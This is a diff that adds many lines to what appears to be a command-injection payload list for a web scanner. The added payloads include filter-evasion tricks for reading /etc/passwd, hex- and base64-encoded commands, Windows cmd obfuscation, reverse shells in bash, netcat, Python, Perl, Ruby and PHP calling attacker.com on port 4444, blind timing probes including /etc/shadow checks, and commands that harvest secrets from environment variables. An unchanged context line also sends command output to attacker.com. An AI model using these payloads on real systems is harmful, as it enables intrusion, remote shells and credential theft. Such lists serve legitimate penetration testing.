@@ -250,3 +250,105 @@ $(printf '\x69\x64')
 ;python3 -c "import urllib.request;urllib.request.urlopen('http://attacker.com/?x='+__import__('subprocess').check_output('id',shell=True).decode())"
 & ping /n 1 attacker.com
 & nslookup attacker.com
+
+# ── $IFS EVASION EXTENDED ──
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat${IFS}${IFS}/etc/passwd
+;cat$IFS$IFS/etc/passwd
+;cat${IFS:0:1}/etc/passwd
+;id${IFS}&&${IFS}whoami
+;{cat,${IFS}/etc/passwd}
+;cat</etc/passwd>/tmp/out
+;tee</etc/passwd>/tmp/out
+;cat /etc/p?sswd
+;cat /etc/pa??wd
+;c?t /etc/passwd
+;ca? /etc/passwd
+;/bin/c?t /etc/passwd
+;/b?n/cat /etc/passwd
+;/bi?/cat /etc/passwd
+
+# ── HEX / OCTAL ENCODING (LINUX) ──
+;$'\x69\x64'
+;$'\x77\x68\x6f\x61\x6d\x69'
+;$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+;$'\151\144'
+;$'\167\150\157\141\155\151'
+;$(echo 6964|xxd -r -p)
+;$(echo -e '\x69\x64')
+;$(printf '\x69\x64')
+;`printf '\x69\x64'`
+;eval $(printf '\x69\x64')
+;bash<<<$(base64 -d<<<aWQ=)
+;bash -c {echo,aWQ=}|{base64,-d}|bash
+;echo aWQ=|base64 -d|bash
+;echo d2hvYW1p|base64 -d|sh
+
+# ── WINDOWS CMD EVASION ──
+;^w^h^o^a^m^i
+&^whoami
+;w"ho"a"mi
+;wh^oa^mi
+;who"ami
+;wh""oami
+;set a=whoami&call %a%
+;set x=who&set y=ami&call %x%%y%
+;cmd /c "w"+"h"+"o"+"a"+"m"+"i"
+;cmd.exe /c whoami
+;c:\windows\system32\cmd.exe /c whoami
+;%WINDIR%\system32\cmd.exe /c whoami
+;%COMSPEC% /c whoami
+;%SystemRoot%\System32\cmd.exe /c whoami
+& ping -n 1 127.0.0.1 > nul & whoami
+; ping -n 5 127.0.0.1 > nul
+;cmd /v:on /c "set x=whoami & call !x!"
+
+# ── POLYGLOT SEPARATORS ──
+;id||id|id&id&&id
+;id|id||id&id&&id;id
+id;id|id||id&id&&id
+`id`;id|id||id&id&&id
+$(id);id|id||id&id&&id
+;id%0a|id%0d||id%00&&id%0aid
+;id\nid
+;id\rid
+;id\r\nid
+
+# ── REVERSE SHELL VARIANTS ──
+;bash -i >& /dev/tcp/attacker.com/4444 0>&1
+;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+;0<&196;exec 196<>/dev/tcp/attacker.com/4444;sh <&196 >&196 2>&196
+;nc -e /bin/sh attacker.com 4444
+;nc attacker.com 4444 -e /bin/bash
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444>/tmp/f
+;python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+;perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+;ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# ── BLIND WITH SIDE CHANNEL ──
+;if [ $(id|wc -c) -gt 1 ]; then sleep 3; fi
+;[ "$(id)" ] && sleep 3
+;id > /tmp/ws_cmdi_out
+;whoami > /tmp/ws_cmdi_out
+;cat /etc/passwd > /tmp/ws_cmdi_out
+;ls -la / > /tmp/ws_cmdi_out
+;id >> /tmp/ws_cmdi_log
+; if [ -f /etc/passwd ]; then sleep 3; fi
+; test -f /etc/passwd && sleep 3
+; [ -r /etc/shadow ] && sleep 5
+
+# ── ENVIRONMENT VARIABLE ABUSE ──
+;echo $PATH
+;echo $HOME
+;echo $USER
+;echo $SHELL
+;echo $HOSTNAME
+;echo $OSTYPE
+;printenv PATH
+;env|grep -i pass
+;set|grep -i secret
+;cat /proc/self/environ
+;cat /proc/self/environ|tr '\0' '\n'
+;strings /proc/self/environ
